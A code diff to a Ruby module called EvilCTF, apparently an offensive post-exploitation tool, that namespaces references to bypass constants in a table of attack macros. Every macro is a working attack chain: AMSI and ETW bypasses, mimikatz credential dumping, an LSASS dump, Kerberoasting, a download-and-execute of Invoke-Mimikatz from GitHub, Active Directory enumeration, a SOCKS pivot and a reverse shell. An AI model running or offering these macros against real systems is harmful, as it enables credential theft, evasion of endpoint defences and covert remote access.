@@ -24,31 +24,31 @@ module EvilCTF
 
       def build_macros
         {
-          'kerberoast' => [BYPASS_4MSI_PS,
+          'kerberoast' => [EvilCTF::Bypass::BYPASS_4MSI_PS,
                            "& \"#{EvilCTF::Staging.tool_path('Rubeus.exe')}\" kerberoast /outfile:#{EvilCTF::Staging.tool_path('hashes.txt')} 2>$null"],
-          'dump_creds' => [BYPASS_4MSI_PS, ETW_BYPASS_PS,
+          'dump_creds' => [EvilCTF::Bypass::BYPASS_4MSI_PS, EvilCTF::Bypass::ETW_BYPASS_PS,
                            "& \"#{EvilCTF::Staging.tool_path('mimikatz.exe')}\" \"privilege::debug\" \"sekurlsa::logonpasswords\" exit 2>$null"],
-          'lsass_dump' => [BYPASS_4MSI_PS, ETW_BYPASS_PS,
+          'lsass_dump' => [EvilCTF::Bypass::BYPASS_4MSI_PS, EvilCTF::Bypass::ETW_BYPASS_PS,
                            "& \"#{EvilCTF::Staging.tool_path('procdump64.exe')}\" -accepteula -ma lsass.exe \"#{EvilCTF::Staging.tool_path('lsass.dmp')}\""],
           'invoke-mimikatz' => [
-            BYPASS_4MSI_PS,
-            ETW_BYPASS_PS,
+            EvilCTF::Bypass::BYPASS_4MSI_PS,
+            EvilCTF::Bypass::ETW_BYPASS_PS,
             'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")',
             'Invoke-Mimikatz -DumpCreds'
           ],
-          'sharphound_all' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, "& \"#{EvilCTF::Staging.tool_path('SharpHound.exe')}\" -c all 2>$null"],
-          'seatbelt_all' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, "& \"#{EvilCTF::Staging.tool_path('Seatbelt.exe')}\" -group=all 2>$null"],
-          'rubeus_klist' => [BYPASS_4MSI_PS, "& \"#{EvilCTF::Staging.tool_path('Rubeus.exe')}\" klist 2>$null"],
-          'bypass-etw' => [ETW_BYPASS_PS],
-          'bypass-4msi' => [BYPASS_4MSI_PS],
-          'inveigh_start' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, INVEIGH_START_PS],
-          'socks_init' => [BYPASS_4MSI_PS, ETW_BYPASS_PS,
+          'sharphound_all' => [EvilCTF::Bypass::BYPASS_4MSI_PS, EvilCTF::Bypass::ETW_BYPASS_PS, "& \"#{EvilCTF::Staging.tool_path('SharpHound.exe')}\" -c all 2>$null"],
+          'seatbelt_all' => [EvilCTF::Bypass::BYPASS_4MSI_PS, EvilCTF::Bypass::ETW_BYPASS_PS, "& \"#{EvilCTF::Staging.tool_path('Seatbelt.exe')}\" -group=all 2>$null"],
+          'rubeus_klist' => [EvilCTF::Bypass::BYPASS_4MSI_PS, "& \"#{EvilCTF::Staging.tool_path('Rubeus.exe')}\" klist 2>$null"],
+          'bypass-etw' => [EvilCTF::Bypass::ETW_BYPASS_PS],
+          'bypass-4msi' => [EvilCTF::Bypass::BYPASS_4MSI_PS],
+          'inveigh_start' => [EvilCTF::Bypass::BYPASS_4MSI_PS, EvilCTF::Bypass::ETW_BYPASS_PS, INVEIGH_START_PS],
+          'socks_init' => [EvilCTF::Bypass::BYPASS_4MSI_PS, EvilCTF::Bypass::ETW_BYPASS_PS,
                            "Import-Module \"#{EvilCTF::Staging.tool_path('socks.ps1')}\"; Invoke-SocksProxy -BindPort 1080"],
-          'cred_harvest' => [BYPASS_4MSI_PS, ETW_BYPASS_PS,
+          'cred_harvest' => [EvilCTF::Bypass::BYPASS_4MSI_PS, EvilCTF::Bypass::ETW_BYPASS_PS,
                              "& \"#{EvilCTF::Staging.tool_path('mimikatz.exe')}\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" exit 2>$null"],
-          'nishang_rev' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, NISHANG_REV_PS],
-          'powerview_all' => [BYPASS_4MSI_PS, EvilCTF::Tools.powerview_all_ps],
-          'dom_enum' => [BYPASS_4MSI_PS, EvilCTF::Tools.dom_enum_ps]
+          'nishang_rev' => [EvilCTF::Bypass::BYPASS_4MSI_PS, EvilCTF::Bypass::ETW_BYPASS_PS, NISHANG_REV_PS],
+          'powerview_all' => [EvilCTF::Bypass::BYPASS_4MSI_PS, EvilCTF::Tools.powerview_all_ps],
+          'dom_enum' => [EvilCTF::Bypass::BYPASS_4MSI_PS, EvilCTF::Tools.dom_enum_ps]
         }
       end
 
